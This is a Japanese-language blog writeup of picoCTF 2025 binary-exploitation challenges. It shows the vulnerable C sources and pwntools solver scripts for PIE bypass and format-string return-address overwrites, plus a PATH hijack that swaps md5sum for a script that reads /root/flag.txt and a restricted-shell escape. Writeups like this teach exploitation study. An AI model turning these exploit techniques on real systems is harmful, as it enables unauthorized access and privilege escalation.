@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+    <meta name="google-site-verification" content="g4e1f-rfOGwL8eft4txNmLdl2trU4nFIKvIdVoXx6V8" />
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/picoctf-2025/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/picoctf-2025/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            
+                <li><a href="https://figaro-san.github.io/links">links</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/picoctf-2025/">picoCTF 2025 Writeup</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2025-03-19
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/ctf/">#CTF</a></span>
+    
+
+        <div class="post-content">
+            <h1 id="korehahe">これは何</h1>
+<p>picoCTF 2025 の writeupになります。Binary Exploitation 以外も解答しましたが、あんまり難しい問題でもなかったので記載しません。Binary Exploitation で競技中に解答できたのは</p>
+<ul>
+<li>PIE TIME</li>
+<li>PIE TIME 2</li>
+<li>hash-only-1</li>
+</ul>
+<p>の3つでしたが、writeup には Echo Valley と hash-only-2 も記載します。</p>
+<h1 id="pie-time">PIE TIME</h1>
+<p>ソースとバイナリが配られます。以下にソースとchecksecの結果を示します。</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">signal.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">segfault_handler</span><span>() {
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Segfault Occurred, incorrect address.\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  exit(</span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">win</span><span>() {
+</span><span>  FILE *fptr;
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> c;
+</span><span>
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">You won!\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#888888;">// Open file
+</span><span>  fptr = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(fptr == NULL)
+</span><span>  {
+</span><span>      printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Cannot open file.\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      exit(</span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  }
+</span><span>
+</span><span>  </span><span style="color:#888888;">// Read contents from file
+</span><span>  c = fgetc(fptr);
+</span><span>  </span><span style="color:#8fbfdc;">while </span><span>(c != EOF)
+</span><span>  {
+</span><span>      printf (</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%c</span><span style="color:#556633;">&quot;</span><span>, c);
+</span><span>      c = fgetc(fptr);
+</span><span>  }
+</span><span>
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  fclose(fptr);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
+</span><span>  signal(SIGSEGV, segfault_handler);
+</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>); </span><span style="color:#888888;">// _IONBF = Unbuffered
+</span><span>
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Address of main: </span><span style="color:#7697d6;">%p</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, &amp;main);
+</span><span>
+</span><span>  </span><span style="color:#8fbfdc;">unsigned long</span><span> val;
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Enter the address to jump to, ex =&gt; 0x12345: </span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  scanf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%lx</span><span style="color:#556633;">&quot;</span><span>, &amp;val);
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Your input: </span><span style="color:#7697d6;">%lx</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, val);
+</span><span>
+</span><span>  </span><span style="color:#8fbfdc;">void </span><span>(*foo)(</span><span style="color:#8fbfdc;">void</span><span>) = (</span><span style="color:#8fbfdc;">void </span><span>(*)())val;
+</span><span>  </span><span style="color:#ffb964;">foo</span><span>();
+</span><span>}
+</span></code></pre>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>    Arch:       amd64-64-little
+</span><span>    RELRO:      Full RELRO
+</span><span>    Stack:      Canary found
+</span><span>    NX:         NX enabled
+</span><span>    PIE:        PIE enabled
+</span><span>    SHSTK:      Enabled
+</span><span>    IBT:        Enabled
+</span><span>    Stripped:   No
+</span></code></pre>
+<p>プログラムの処理及びchecksecの結果から、win関数の先頭アドレスを入力として渡すことが出来れば良さそうです。さらにはmainのアドレスがリークしているので、リークした値から相対アドレスを引けばバイナリのベースが得られ、winの関数アドレスが計算できます。これらを考慮してsolverを書きます。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./vuln</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span>
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">rescued-float.picoctf.net</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#cf6a4c;">53964</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">main: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>leak_main = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>), </span><span style="color:#cf6a4c;">16</span><span>)
+</span><span>elf.address = leak_main - elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">main</span><span style="color:#556633;">&#39;</span><span>]
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#ffb964;">hex</span><span>(elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">win</span><span style="color:#556633;">&#39;</span><span>]))
+</span><span style="color:#ffb964;">print</span><span>(p.</span><span style="color:#ffb964;">recvall</span><span>().</span><span style="color:#ffb964;">decode</span><span>())
+</span></code></pre>
+<h1 id="pie-time-2">PIE TIME 2</h1>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">signal.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">segfault_handler</span><span>() {
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Segfault Occurred, incorrect address.\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  exit(</span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">call_functions</span><span>() {
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buffer[</span><span style="color:#cf6a4c;">64</span><span>];
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Enter your name:</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  fgets(buffer, </span><span style="color:#cf6a4c;">64</span><span>, stdin);
+</span><span>  printf(buffer);
+</span><span>
+</span><span>  </span><span style="color:#8fbfdc;">unsigned long</span><span> val;
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;"> enter the address to jump to, ex =&gt; 0x12345: </span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  scanf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%lx</span><span style="color:#556633;">&quot;</span><span>, &amp;val);
+</span><span>
+</span><span>  </span><span style="color:#8fbfdc;">void </span><span>(*foo)(</span><span style="color:#8fbfdc;">void</span><span>) = (</span><span style="color:#8fbfdc;">void </span><span>(*)())val;
+</span><span>  </span><span style="color:#ffb964;">foo</span><span>();
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">win</span><span>() {
+</span><span>  FILE *fptr;
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> c;
+</span><span>
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">You won!\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#888888;">// Open file
+</span><span>  fptr = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(fptr == NULL)
+</span><span>  {
+</span><span>      printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Cannot open file.\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      exit(</span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  }
+</span><span>
+</span><span>  </span><span style="color:#888888;">// Read contents from file
+</span><span>  c = fgetc(fptr);
+</span><span>  </span><span style="color:#8fbfdc;">while </span><span>(c != EOF)
+</span><span>  {
+</span><span>      printf (</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%c</span><span style="color:#556633;">&quot;</span><span>, c);
+</span><span>      c = fgetc(fptr);
+</span><span>  }
+</span><span>
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  fclose(fptr);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
+</span><span>  signal(SIGSEGV, segfault_handler);
+</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>); </span><span style="color:#888888;">// _IONBF = Unbuffered
+</span><span>
+</span><span>  </span><span style="color:#ffb964;">call_functions</span><span>();
+</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>}
+</span></code></pre>
+<p>前回と同じでwinが存在しており、入力でwinの関数アドレスを渡すことは変わらないようですが、今度はFSBが存在しています。解法としてはFSBでスタック上のリターンアドレスをリークし、前回と同じ方法でベースアドレスを算出します。そうすればwin関数のアドレスをpwntoolsが計算してくれるので、それを文字列として送信するだけです。ごちゃごちゃしていると、リターンアドレスは19番目に位置していると分かるので、<code>%19$p</code>を送信してリターンアドレスを得ています。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./vuln</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">rescued-float.picoctf.net</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#cf6a4c;">61604</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">name:</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">%19$p</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>main_leak = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>), </span><span style="color:#cf6a4c;">16</span><span>)
+</span><span>
+</span><span style="color:#888888;"># リークしたアドレス - 実行前の相対アドレス = ベースアドレス
+</span><span>elf.address = main_leak - </span><span style="color:#cf6a4c;">0x1441 
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">0x12345: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#ffb964;">hex</span><span>(elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">win</span><span style="color:#556633;">&#39;</span><span>]))
+</span><span style="color:#ffb964;">print</span><span>(p.</span><span style="color:#ffb964;">recvall</span><span>().</span><span style="color:#ffb964;">decode</span><span>())
+</span></code></pre>
+<h1 id="hash-only-1">hash-only-1</h1>
+<p>インスタンスを起動すると接続先のみが渡されます。接続してみるとカレントディレクトリには<code>flaghasher</code>というプログラムが存在しており、それを実行してみると、<code>/root/flag.txt</code>の内容を<code>md5sum</code>でハッシュ化して出力しているようでした。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ ./flaghasher
+</span><span>Computing the MD5 hash of /root/flag.txt.... 
+</span><span>
+</span><span>37b576b3ec8179c5714bcd173ce8c1cc  /root/flag.txt
+</span></code></pre>
+<p>また、プログラムがダウンロードできるとのことだったので、ダウンロードして<code>strings</code>にかけてみました。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ strings flaghasher | grep md5sum
+</span><span>/bin/bash -c &#39;md5sum /root/flag.txt&#39;
+</span></code></pre>
+<p>ここには載せていないのですが、この後<code>ghidra</code>での解析を行ってみると、どうやら上記文字列は<code>system()</code>を通じて実行されているようでした。この時点で、<code>flaghasher</code>自体は何の入力も受け付けていないため、<code>flaghasher</code>自体を攻撃するのではなく、それが利用するコマンドや環境を攻撃するべきかと考えました。もう少し調査を進めてみると <code>PATH</code>の変更が可能であったため、<code>md5sum</code>をこちらが用意した悪意のある同名の<code>md5sum</code>スクリプトにすりかえ、その中では<code>cat /root/flag.txt</code>を実行させれば良いのでは無いかと思いつきます。すり替えるためには<code>PATH</code>により優先順位の高いディレクトリを追加し、そのディレクトリの中に自前の<code>md5sum</code>を追加すれば良いはずです。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ export PATH=/tmp:$PATH
+</span><span>$ echo &#39;cat /root/flag.txt&#39; &gt; md5sum
+</span><span>$ mv md5sum /tmp
+</span><span>$ ./flaghasher
+</span></code></pre>
+<p>これでフラグを入手できました。</p>
+<h1 id="hash-only-2">hash-only-2</h1>
+<p>hash-only-1と同じように接続先が渡されます。今後は<code>rbash</code>となっており、様々なコマンドやリダイレクトなどが制限された環境になっています。私は解答できませんでしたが、writeupを見る限りどうやら<code>bash</code>コマンドが使えたようです。そうすれば制限の無い通常のシェルを利用でき、この状態でhash-only-1と同じことをすればフラグが入手できました。</p>
+<p>競技終了後に調べたところ、<a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">Linux Restricted Shell Bypass</a>という資料を発見しました。今回の解法と似たようなことが書いてあります。競技中、<code>rbash</code>についてのバイパスを調べることを怠っていたので、とても後悔しました。</p>
+<p>最近kurenaif氏のCTF入門講座が個人的に刺さっていたのですが、競技時間中に知らないことを調べないのはお話にならないことをhash-only-2でも痛感しました。</p>
+<h1 id="echo-valley">Echo Valley</h1>
+<p>ソースとバイナリが配られます。ソースは下記。</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">string.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">print_flag</span><span>() {
+</span><span>    </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">32</span><span>];
+</span><span>    FILE *file = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">/home/valley/flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>
+</span><span>    </span><span style="color:#8fbfdc;">if </span><span>(file == NULL) {
+</span><span>      perror(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Failed to open flag file</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      exit(EXIT_FAILURE);
+</span><span>    }
+</span><span>    
+</span><span>    fgets(buf, sizeof(buf), file);
+</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Congrats! Here is your flag: </span><span style="color:#7697d6;">%s</span><span style="color:#556633;">&quot;</span><span>, buf);
+</span><span>    fclose(file);
+</span><span>    exit(EXIT_SUCCESS);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">echo_valley</span><span>() {
+</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Welcome to the Echo Valley, Try Shouting: \n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>
+</span><span>    </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">100</span><span>];
+</span><span>
+</span><span>    </span><span style="color:#8fbfdc;">while</span><span>(</span><span style="color:#cf6a4c;">1</span><span>)
+</span><span>    {
+</span><span>        fflush(stdout);
+</span><span>        fgets(buf, sizeof(buf), stdin);
+</span><span>
+</span><span>        </span><span style="color:#8fbfdc;">if </span><span>(strcmp(buf, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">exit\n</span><span style="color:#556633;">&quot;</span><span>) == </span><span style="color:#cf6a4c;">0</span><span>) {
+</span><span>            printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">The Valley Disappears\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>            </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>        }
+</span><span>
+</span><span>        printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">You heard in the distance: </span><span style="color:#556633;">&quot;</span><span>);
+</span><span>        printf(buf);
+</span><span>        fflush(stdout);
+</span><span>    }
+</span><span>    fflush(stdout);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>()
+</span><span>{
+</span><span>    </span><span style="color:#ffb964;">echo_valley</span><span>();
+</span><span>    </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>}
+</span></code></pre>
+<p>解法は難しくなく、はじめにFSBの脆弱性を通じてリターンアドレスと退避された<code>rbp</code>を入手します。<code>gdb</code>などで調べると、退避された<code>rbp</code>の値から0x8を減算すると、そこにはリターンアドレスが存在していることが分かります。また、リターンアドレスは、当該命令が相対アドレスで<code>0x1413</code>と分かるので、リークしたリターンアドレスから<code>0x1413</code>を減算すればバイナリのベースアドレスが算出できると分かります。ベースアドレスが算出できれば、<code>pwntools</code>が<code>print_flag()</code>関数のアドレスも算出してくれるのでそれを利用できます。</p>
+<p>準備が整ったので、「リターンアドレスのアドレス(<code>saved_rbp-0x8</code>)」に<code>print_flag()</code>のアドレスを書き込むように書式文字列を作成・送信すればフラグが入手できます。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./valley</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span style="color:#888888;">#p = process(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">shape-facility.picoctf.net</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#cf6a4c;">54075</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">%20$p.%21$p</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">distance: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>leak = p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>).</span><span style="color:#ffb964;">split</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">.</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>elf.address = </span><span style="color:#ffb964;">int</span><span>(leak[</span><span style="color:#cf6a4c;">1</span><span>], </span><span style="color:#cf6a4c;">16</span><span>) - </span><span style="color:#cf6a4c;">0x1413
+</span><span>addr_retaddr = </span><span style="color:#ffb964;">int</span><span>(leak[</span><span style="color:#cf6a4c;">0</span><span>], </span><span style="color:#cf6a4c;">16</span><span>) - </span><span style="color:#cf6a4c;">0x8
+</span><span>
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">base: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(elf.address)}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">loca: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(addr_retaddr)}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>payload = </span><span style="color:#ffb964;">fmtstr_payload</span><span>(</span><span style="color:#cf6a4c;">6</span><span>, {addr_retaddr: elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">print_flag</span><span style="color:#556633;">&#39;</span><span>]}, </span><span style="color:#ffb964;">write_size</span><span>=</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">short</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">exit</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<p>私は競技時間内に解答できなかったのですが、これに関しては1つ謎が残っています。というのもベースアドレスを算出するために<code>0x1413</code>をここでは減算していますが、これは<code>objdump</code>などのコマンドで<code>main</code>が<code>call echo_valley</code>した次の命令アドレスを見れば、減算する値は<code>0x1413</code>であることを確認できます。これは納得できる話ですし、実際競技時間中に私も行いました。問題なのはここからで、私がダウンロードしたバイナリでは、<code>call echo_valley</code>の次の命令アドレスは<code>0x1315</code>だったのです。こればかりは見間違いでもなく、何度も確認していたはずです。それだというのに他のwriteupを見てみると<code>0x1413</code>を減算していたり、リターンアドレスから<code>0x1aa</code>を減算することで<code>print_flag</code>のアドレスとしていたりで、自分のオフセットとは何かが違うことに気づきました。そう思ってもう一度バイナリをダウンロードしてみると、何故か<code>call echo_valley</code>の次の命令アドレスは<code>0x1413</code>だったのです。これは私が何かを間違えたのか、それもバイナリが何か変わったのか、何にせよ発狂しました。</p>
+<p>あと<code>write_size='short'</code>が分かりません。2byteごとに値を書き込んでいくものだと思っていますが、<code>int</code>や<code>byte</code>では成功しませんでした。<code>byte</code>はペイロードが100byteを超えていたのでさもありなん。<code>int</code>は超えていないのに成功しない -&gt; 意味わかんない</p>
+<h1 id="zhong-warini">終わりに</h1>
+<p>exploitの自信を砕かれました。驕らずに生きていきます。</p>
+
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/c2c-ctf-2025-writeup/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">C2C CTF 2025 Writeup</span>
+                            </a>
+                        </span>
+                    
+                    
+                        <span class="button next">
+                            <a href="https://figaro-san.github.io/pascalctf/">
+                                <span class="button__text">PascalCTF Writeup</span>&nbsp;
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
